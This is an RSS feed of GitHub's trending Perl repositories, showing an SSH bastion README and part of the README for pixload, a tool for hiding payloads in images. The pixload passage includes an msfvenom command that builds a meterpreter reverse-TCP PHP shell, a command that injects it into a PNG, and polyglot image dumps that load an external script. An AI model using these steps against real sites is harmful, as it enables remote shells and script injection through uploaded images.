<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Perl Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-07-04T01:54:58Z</updated>
  <subtitle>Daily Trending of Perl in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>ovh/the-bastion</title>
    <updated>2022-07-04T01:54:58Z</updated>
    <id>tag:github.com,2022-07-04:/ovh/the-bastion</id>
    <link href="https://github.com/ovh/the-bastion" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Authentication, authorization, traceability and auditability for SSH accesses.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/218502/96882661-d3b21e80-147f-11eb-8d89-a69e37a5870b.png&#34; alt=&#34;The Bastion Logo&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;&lt;span&gt;🔒&lt;/span&gt; The Bastion&lt;/h1&gt; &#xA;&lt;p&gt;Bastions are a cluster of machines used as the unique entry point by operational teams (such as sysadmins, developers, database admins, ...) to securely connect to devices (servers, virtual machines, cloud instances, network equipment, ...), usually using &lt;code&gt;ssh&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Bastions provides mechanisms for authentication, authorization, traceability and auditability for the whole infrastructure.&lt;/p&gt; &#xA;&lt;p&gt;Learn more by reading the blog post series that announced the release:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.ovh.com/blog/the-ovhcloud-bastion-part-1/&#34;&gt;Part 1 - Genesis&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.ovh.com/blog/the-ovhcloud-ssh-bastion-part-2-delegation-dizziness/&#34;&gt;Part 2 - Delegation Dizziness&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.ovh.com/blog/the-bastion-part-3-security-at-the-core/&#34;&gt;Part 3 - Security at the Core&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.ovh.com/blog/the-bastion-part-4-a-new-era/&#34;&gt;Part 4 - A new era&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;&lt;span&gt;🎥&lt;/span&gt; Quick connection and replay example&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://asciinema.org/a/369555?autoplay=1&#34;&gt;&lt;img src=&#34;https://asciinema.org/a/369555.png&#34; alt=&#34;asciicast&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;&lt;span&gt;🔧&lt;/span&gt; Installing, upgrading, using The Bastion&lt;/h2&gt; &#xA;&lt;p&gt;Please see the &lt;a href=&#34;https://ovh.github.io/the-bastion/&#34;&gt;online documentation&lt;/a&gt;, or the corresponding text-based version found in the &lt;code&gt;doc/&lt;/code&gt; folder.&lt;/p&gt; &#xA;&lt;h2&gt;&lt;span&gt;⚡&lt;/span&gt; TL;DR: disposable sandbox using Docker&lt;/h2&gt; &#xA;&lt;p&gt;This is a good way to test The Bastion within seconds, but &lt;a href=&#34;https://ovh.github.io/the-bastion/faq.html#can-i-run-it-under-docker-in-production&#34;&gt;read the FAQ&lt;/a&gt; if you&#39;re serious about using containerization in production.&lt;/p&gt; &#xA;&lt;p&gt;The sandbox image is available for the following architectures: linux/386, linux/amd64, linux/arm/v6, linux/arm/v7, linux/arm64, linux/ppc64le, linux/s390x.&lt;/p&gt; &#xA;&lt;p&gt;Let&#39;s run the docker image:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;docker run -d -p 22 --name bastiontest ovhcom/the-bastion:sandbox&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Get your public SSH key at hand, then configure the first administrator account:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;docker exec -it bastiontest /opt/bastion/bin/admin/setup-first-admin-account.sh poweruser auto&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;We&#39;re now up and running with the default configuration! Let&#39;s setup a handy bastion alias, and test the &lt;code&gt;info&lt;/code&gt; command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PORT=$(docker port bastiontest | cut -d: -f2)&#xA;alias bastion=&#34;ssh poweruser@127.0.0.1 -tp $PORT -- &#34;&#xA;bastion --osh info&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It should greet you as being a bastion admin, which means you have access to all commands. Let&#39;s enter interactive mode:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;bastion -i&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This is useful to call several &lt;code&gt;--osh&lt;/code&gt; plugins in a row. Now we can ask for help to see all plugins:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$&amp;gt; help&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you have a remote machine you want to try to connect to through the bastion, fetch your egress key:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$&amp;gt; selfListEgressKeys&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Copy this public key to the remote machine&#39;s &lt;code&gt;authorized_keys&lt;/code&gt; under the &lt;code&gt;.ssh/&lt;/code&gt; folder of the account you want to connect to, then:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$&amp;gt; selfAddPersonalAccess --host &amp;lt;remote_host&amp;gt; --user &amp;lt;remote_account_name&amp;gt; --port-any&#xA;$&amp;gt; ssh &amp;lt;remote_account_name&amp;gt;@&amp;lt;remote_host&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note that you can connect directly without using interactive mode, with:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;bastion &amp;lt;remote_account_name&amp;gt;@&amp;lt;remote_machine_host_or_ip&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;That&#39;s it! Of course, there is a lot more to it, documentation is available under the &lt;code&gt;doc/&lt;/code&gt; folder and &lt;a href=&#34;https://ovh.github.io/the-bastion/&#34;&gt;online&lt;/a&gt;. Be sure to check the help of the bastion (&lt;code&gt;bastion --help&lt;/code&gt;) and the help of each osh plugin (&lt;code&gt;bastion --osh command --help&lt;/code&gt;). Also don&#39;t forget to customize your &lt;code&gt;bastion.conf&lt;/code&gt; file, which can be found in &lt;code&gt;/etc/bastion/bastion.conf&lt;/code&gt; (for Linux).&lt;/p&gt; &#xA;&lt;h2&gt;&lt;span&gt;🔀&lt;/span&gt; Compatibility&lt;/h2&gt; &#xA;&lt;h3&gt;Supported OS for installation&lt;/h3&gt; &#xA;&lt;p&gt;Linux distros below are tested with each release, but as this is a security product, you are &lt;strong&gt;warmly&lt;/strong&gt; advised to run it on the latest up-to-date stable version of your favorite OS:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Debian 11 (Bullseye), Debian 10 (Buster), 9 (Stretch)&lt;/li&gt; &#xA; &lt;li&gt;CentOS 7.x&lt;/li&gt; &#xA; &lt;li&gt;RockyLinux 8.x&lt;/li&gt; &#xA; &lt;li&gt;Ubuntu LTS 20.04, 18.04, 16.04&lt;/li&gt; &#xA; &lt;li&gt;OpenSUSE Leap 15.3*&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;*: Note that these versions have no out-of-the-box MFA support, as they lack packaged versions of &lt;code&gt;pamtester&lt;/code&gt;, &lt;code&gt;pam-google-authenticator&lt;/code&gt;, or both. Of course, you may compile those yourself. Any other so-called &#34;modern&#34; Linux version are not tested with each release, but should work with no or minor adjustments.&lt;/p&gt; &#xA;&lt;p&gt;The following OS are also tested with each release:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;FreeBSD/HardenedBSD 13.0**&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;**: Note that these have partial MFA support, due to their reduced set of available &lt;code&gt;pam&lt;/code&gt; plugins. Support for either an additional password or TOTP factor can be configured, but not both at the same time. The code is actually known to work on FreeBSD/HardenedBSD 10+, but it&#39;s only regularly tested under 13.0.&lt;/p&gt; &#xA;&lt;p&gt;Other BSD variants, such as OpenBSD and NetBSD, are unsupported as they have a severe limitation over the maximum number of supplementary groups, causing problems for group membership and restricted commands checks, as well as no filesystem-level ACL support and missing PAM support (hence no MFA).&lt;/p&gt; &#xA;&lt;h3&gt;Zero assumption on your environment&lt;/h3&gt; &#xA;&lt;p&gt;Nothing fancy is needed either on the ingress or the egress side of The Bastion to make it work.&lt;/p&gt; &#xA;&lt;p&gt;In other words, only your good old &lt;code&gt;ssh&lt;/code&gt; client is needed to connect through it, and on the other side, any standard &lt;code&gt;sshd&lt;/code&gt; server will do the trick. This includes, for example, network devices on which you may not have the possibility to install any custom software.&lt;/p&gt; &#xA;&lt;h2&gt;&lt;span&gt;➰&lt;/span&gt; Reliability&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The KISS principle is used where possible for design and code: less complicated code means more auditability and less bugs&lt;/li&gt; &#xA; &lt;li&gt;Only a few well-known libraries are used, less third party code means a tinier attack surface&lt;/li&gt; &#xA; &lt;li&gt;The bastion is engineered to be self-sufficient: no dependencies such as databases, other daemons, other machines, or third-party cloud services, statistically means less downtime&lt;/li&gt; &#xA; &lt;li&gt;High availability can be setup so that multiple bastion instances form a cluster of several instances, with any instance usable at all times (active/active scheme)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;&lt;span&gt;🆗&lt;/span&gt; Code quality&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The code is ran under &lt;code&gt;perltidy&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;The code is also ran under &lt;code&gt;perlcritic&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Functional tests are used before every release&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;&lt;span&gt;🛂&lt;/span&gt; Security at the core&lt;/h2&gt; &#xA;&lt;p&gt;Even with the most conservative, precautionous and paranoid coding process, code has bugs, so it shouldn&#39;t be trusted blindly. Hence the bastion doesn&#39;t trust its own code. It leverages the operating system security primitives to get additional security, as seen below.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Uses the well-known and trusted UNIX Discretionary Access Control:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Bastion users are mapped to actual system users&lt;/li&gt; &#xA;   &lt;li&gt;Bastion groups are mapped to actual system groups&lt;/li&gt; &#xA;   &lt;li&gt;All the code is constantly checking rights before allowing any action&lt;/li&gt; &#xA;   &lt;li&gt;UNIX DAC is used as a safety belt to prevent an action from succeeding even if the code is tricked into allowing it&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The bastion main script is declared as the bastion user&#39;s system shell:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;No user has real (&lt;code&gt;bash&lt;/code&gt;-like) shell access on the system&lt;/li&gt; &#xA;   &lt;li&gt;All code is ran under the unprivileged user&#39;s system account rights&lt;/li&gt; &#xA;   &lt;li&gt;Even if a user could escape to a real shell, they wouldn&#39;t be able to connect to machines they don&#39;t have access to, because they don&#39;t have filesystem-level read access to the SSH keys&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The code is modular&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;The main code mainly checks rights, logs actions, and enable &lt;code&gt;ssh&lt;/code&gt; access to other machines&lt;/li&gt; &#xA;   &lt;li&gt;All side commands, called &lt;em&gt;plugins&lt;/em&gt;, are in modules separated from the main code&lt;/li&gt; &#xA;   &lt;li&gt;The modules can either be &lt;em&gt;open&lt;/em&gt; or &lt;em&gt;restricted&lt;/em&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;Only accounts that have been specifically granted on a need-to-use basis can run a specific restricted plugin&lt;/li&gt; &#xA;     &lt;li&gt;This is checked by the code, and also enforced by UNIX DAC (the plugin is only readable and executable by the system group specific to the plugin)&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;All the code needing extended system privileges is separated from the main code, in modules called &lt;em&gt;helpers&lt;/em&gt;&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Helpers are run exclusively under &lt;code&gt;sudo&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;The &lt;code&gt;sudoers&lt;/code&gt; configuration is attached to a system group specific to the command, which is granted to accounts on a need-to-use basis&lt;/li&gt; &#xA;   &lt;li&gt;The helpers are only readable and executable by the system group specific to the command&lt;/li&gt; &#xA;   &lt;li&gt;The helpers path and some of their immutable parameters are hardcoded in the &lt;code&gt;sudoers&lt;/code&gt; configuration&lt;/li&gt; &#xA;   &lt;li&gt;Perl tainted mode (&lt;code&gt;-T&lt;/code&gt;) is used for all code running under &lt;code&gt;sudo&lt;/code&gt;, preventing any user-input to interfere with the logic, by halting execution immediately&lt;/li&gt; &#xA;   &lt;li&gt;Code running under &lt;code&gt;sudo&lt;/code&gt; doesn&#39;t trust its caller and re-checks every input&lt;/li&gt; &#xA;   &lt;li&gt;Communication between unprivileged and privileged-code are done using JSON&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;A protocol break is operated between the ingress and the egress side, rendering most protocol-based vulnerabilities ineffective&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;&lt;span&gt;🔍&lt;/span&gt; Auditability&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Bastion administrators must use the bastion&#39;s logic to connect to itself to administer it (or better, use another bastion to do so), this ensures auditability in all cases&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Every access and action (whether allowed or denied) is logged with: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;syslog&lt;/code&gt;, which should also be sent to a remote syslog server to ensure even bastion administrators can&#39;t tamper their tracks, and/or&lt;/li&gt; &#xA;   &lt;li&gt;local &lt;code&gt;sqlite3&lt;/code&gt; databases for easy searching&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Every session is recorded with &lt;code&gt;ttyrec&lt;/code&gt;, helper scripts are provided to encrypt and push these records on a remote escrow filer&lt;/li&gt; &#xA; &lt;li&gt;This code is used in production in several PCI-DSS, ISO 27001, SOC1 and SOC2 certified environments&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;&lt;span&gt;🔗&lt;/span&gt; Related&lt;/h2&gt; &#xA;&lt;h3&gt;Dependencies&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ovh/ovh-ttyrec&#34;&gt;ovh-ttyrec&lt;/a&gt; - an enhanced but compatible version of ttyrec, a terminal (tty) recorder&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Optional tools&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ovh/yubico-piv-checker&#34;&gt;yubico-piv-checker&lt;/a&gt; - a self-contained go binary to check the validity of PIV keys and certificates. Optional, to enable The Bastion PIV-aware functionalities&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://forge.puppet.com/modules/goldenkiwi/thebastion&#34;&gt;puppet-thebastion&lt;/a&gt; (&lt;a href=&#34;https://github.com/ovh/puppet-thebastion&#34;&gt;GitHub&lt;/a&gt;) - a Puppet module to automate and maintain the configuration of The Bastion machines&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ovh/the-bastion-ansible-wrapper&#34;&gt;the-bastion-ansible-wrapper&lt;/a&gt; - a wrapper to make it possible to run Ansible playbooks through The Bastion&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ovh/debian-cis&#34;&gt;debian-cis&lt;/a&gt; - a script to apply and monitor the hardening of Debian hosts as per the &lt;a href=&#34;https://www.cisecurity.org/benchmark/debian_linux/&#34;&gt;CIS&lt;/a&gt; recommendations&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;&lt;span&gt;📝&lt;/span&gt; License&lt;/h2&gt; &#xA;&lt;p&gt;Licensed under the Apache License, Version 2.0 (the &#34;License&#34;); you may not use this file except in compliance with the License. You may obtain a copy of the License at&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;http://www.apache.org/licenses/LICENSE-2.0&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an &#34;AS IS&#34; BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>chinarulezzz/pixload</title>
    <updated>2022-07-04T01:54:58Z</updated>
    <id>tag:github.com,2022-07-04:/chinarulezzz/pixload</id>
    <link href="https://github.com/chinarulezzz/pixload" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Image Payload Creating/Injecting tools&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;pixload -- Image Payload Creating tools&lt;/h1&gt; &#xA;&lt;h2&gt;DESCRIPTION&lt;/h2&gt; &#xA;&lt;p&gt;Set of tools for &lt;del&gt;hiding backdoors&lt;/del&gt; creating/injecting payload into images.&lt;/p&gt; &#xA;&lt;p&gt;The following image types are currently supported: BMP, GIF, JPG, PNG, WebP.&lt;/p&gt; &#xA;&lt;h4&gt;about&lt;/h4&gt; &#xA;&lt;p&gt;Useful references for better understanding of &lt;code&gt;pixload&lt;/code&gt; and its use-cases:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs&#34;&gt;Bypassing CSP using polyglot JPEGs&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://web.archive.org/web/20190226193728/https://devcondetect.com/blog/2019/2/24/hacking-group-using-polyglot-images-to-hide-malvertsing-attacks&#34;&gt;Hacking group using Polyglot images to hide malvertising attacks&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/&#34;&gt;Encoding Web Shells in PNG IDAT chunks&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://whitton.io/articles/xss-on-facebook-via-png-content-types/&#34;&gt;An XSS on Facebook via PNGs &amp;amp; Wonky Content Types&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://www.adamlogue.com/revisiting-xss-payloads-in-png-idat-chunks/&#34;&gt;Revisiting XSS payloads in PNG IDAT chunks&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;If you want to encode a payload in such a way that the resulting binary blob is both valid x86 shellcode and a valid image file, I recommend you to look &lt;a href=&#34;https://web.archive.org/web/20201008001325/https://warroom.securestate.com/bmp-x86-polyglot/&#34;&gt;here&lt;/a&gt; and &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/raw/master/modules/encoders/x86/bmp_polyglot.rb&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h4&gt;msfvenom&lt;/h4&gt; &#xA;&lt;p&gt;If you want to inject a metasploit payload, you have to do something like this:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Create metasploit payload (i.e. php).&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ msfvenom -p php/meterpreter_reverse_tcp \&#xA;&#x9;LHOST=192.168.0.1 LPORT=31337 -f raw &amp;gt; payload.php&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt; &lt;p&gt;Edit &lt;code&gt;payload.php&lt;/code&gt; if needed.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Inject &lt;code&gt;payload.php&lt;/code&gt; into the image (i.e. png).&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pixload-png --payload &#34;$(cat payload.php)&#34; payload.png&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;SETUP&lt;/h2&gt; &#xA;&lt;h5&gt;Dependencies&lt;/h5&gt; &#xA;&lt;p&gt;The following Perl modules are required:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;GD&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Image::ExifTool&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;String::CRC32&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;On &lt;code&gt;Debian-based&lt;/code&gt; systems install these packages:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo apt install libgd-perl libimage-exiftool-perl libstring-crc32-perl&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On &lt;code&gt;FreeBSD&lt;/code&gt; and &lt;code&gt;DragonFlyBSD&lt;/code&gt; install these packages:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;doas pkg install p5-GD p5-Image-ExifTool p5-String-CRC32&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On &lt;code&gt;OSX&lt;/code&gt; please refer to &lt;a href=&#34;https://github.com/chinarulezzz/pixload/issues/3&#34;&gt;this workaround&lt;/a&gt; (thnx 2 @iosdec).&lt;/p&gt; &#xA;&lt;h5&gt;Build and Install&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;make install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Docker&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;docker build -t pixload .&#xA;docker run -v &#34;$(pwd):/pixload&#34; -it --rm pixload&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;TOOLS&lt;/h2&gt; &#xA;&lt;h3&gt;pixload-bmp&lt;/h3&gt; &#xA;&lt;h5&gt;Help&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pixload-bmp --help&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;Usage: pixload-bmp [OPTION]... FILE&#xA;Hide Payload/Malicious Code in BMP Images.&#xA;&#xA;Mandatory arguments to long options are mandatory for short options too.&#xA;  -P, --payload STRING   set payload for injection&#xA;  -v, --version          print version and exit&#xA;  -h, --help             print help and exit&#xA;&#xA;If the output FILE already exists, then payload will be injected into this&#xA;existing file. Otherwise, the new one will be created.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Example&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pixload-bmp payload.bmp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;......... BMP Payload Creator/Injector ........&#xA;...............................................&#xA;... https://github.com/chinarulezzz/pixload ...&#xA;...............................................&#xA;&#xA;[&amp;gt;] Generating output file&#xA;[✔] File saved to: payload.bmp&#xA;&#xA;[&amp;gt;] Injecting payload into payload.bmp&#xA;[✔] Payload was injected successfully&#xA;&#xA;payload.bmp: PC bitmap, OS/2 1.x format, 1 x 1 x 24, cbSize 10799, bits offset 26&#xA;&#xA;00000000  42 4d 2f 2a 00 00 00 00  00 00 1a 00 00 00 0c 00  |BM/*............|&#xA;00000010  00 00 01 00 01 00 01 00  18 00 00 00 ff 00 2a 2f  |..............*/|&#xA;00000020  3d 31 3b 3c 73 63 72 69  70 74 20 73 72 63 3d 2f  |=1;&amp;lt;script src=/|&#xA;00000030  2f 65 78 61 6d 70 6c 65  2e 63 6f 6d 3e 3c 2f 73  |/example.com&amp;gt;&amp;lt;/s|&#xA;00000040  63 72 69 70 74 3e 3b                              |cript&amp;gt;;|&#xA;00000047&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://github.com/chinarulezzz/pixload/raw/master/pixload-bmp.1.pod&#34;&gt;pixload-bmp(1)&lt;/a&gt; manual page for more information.&lt;/p&gt; &#xA;&lt;h3&gt;pixload-gif&lt;/h3&gt; &#xA;&lt;h5&gt;Help&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pixload-gif --help&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;Usage: pixload-gif [OPTION]... FILE&#xA;Hide payload/malicious code in GIF images.&#xA;&#xA;Mandatory arguments to long options are mandatory for short options too.&#xA;  -W, --pixelwidth  INTEGER   (has no effect)&#xA;                              set pixel width for the new image (default: 10799)&#xA;  -H, --pixelheight INTEGER   set pixel height for the new image (default: 32)&#xA;  -P, --payload     STRING    set payload for injection&#xA;  -v, --version               print version and exit&#xA;  -h, --help                  print help and exit&#xA;&#xA;The option -W, --pixelwidth has no effect since pixload-gif rewrites&#xA;pixel width bytes with &#34;/*&#34; characters, to prepare the polyglot gif image.&#xA;&#xA;If the output FILE already exists, then the payload will be injected into this&#xA;existing file. Otherwise, the new one will be created with specified pixels&#xA;wide.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Example&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pixload-gif payload.gif&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;........ GIF Payload Creator/Injector .........&#xA;...............................................&#xA;... https://github.com/chinarulezzz/pixload ...&#xA;...............................................&#xA;&#xA;[&amp;gt;] Generating output file&#xA;[✔] File saved to: payload.gif&#xA;&#xA;[&amp;gt;] Injecting payload into payload.gif&#xA;[✔] Payload was injected successfully&#xA;&#xA;payload.gif: GIF image data, version 87a, 10799 x 32&#xA;&#xA;00000000  47 49 46 38 37 61 2f 2a  20 00 80 00 00 04 02 04  |GIF87a/* .......|&#xA;00000010  00 00 00 2c 00 00 00 00  20 00 20 00 00 02 1e 84  |...,.... . .....|&#xA;00000020  8f a9 cb ed 0f a3 9c b4  da 8b b3 de bc fb 0f 86  |................|&#xA;00000030  e2 48 96 e6 89 a6 ea ca  b6 ee 0b 9b 05 00 3b 2a  |.H............;*|&#xA;00000040  2f 3d 31 3b 3c 73 63 72  69 70 74 20 73 72 63 3d  |/=1;&amp;lt;script src=|&#xA;00000050  2f 2f 65 78 61 6d 70 6c  65 2e 63 6f 6d 3e 3c 2f  |//example.com&amp;gt;&amp;lt;/|&#xA;00000060  73 63 72 69 70 74 3e 3b                           |script&amp;gt;;|&#xA;00000068&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://github.com/chinarulezzz/pixload/raw/master/pixload-gif.1.pod&#34;&gt;pixload-gif(1)&lt;/a&gt; manual page for more information.&lt;/p&gt; &#xA;&lt;h3&gt;pixload-jpg&lt;/h3&gt; &#xA;&lt;h5&gt;Help&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pixload-jpg --help&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;Usage: pixload-jpg [OPTION]... FILE&#xA;Hide Payload/Malicious Code in JPEG images.&#xA;&#xA;Mandatory arguments to long options are mandatory for short options too.&#xA;  -S, --section COM|DQT         set section for payload injection&#xA;  -P, --payload STRING          set payload for injection&#xA;  -v, --version                 print version and exit&#xA;  -h, --help                    print help and exit&#xA;&#xA;If the output FILE already exists, then payload will be injected into this&#xA;existing file. Otherwise, the new one will be created.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Examples&lt;/h5&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Inject payload into comment section:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pixload-jpg -S com payload.jpg&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;........ JPEG Payload Creator/Injector ........&#xA;...............................................&#xA;... https://github.com/chinarulezzz/pixload ...&#xA;...............................................&#xA;&#xA;[&amp;gt;] Generating output file&#xA;[✔] File saved to: payload.jpg&#xA;&#xA;[&amp;gt;] Injecting payload into COMMENT&#xA;[✔] Payload was injected 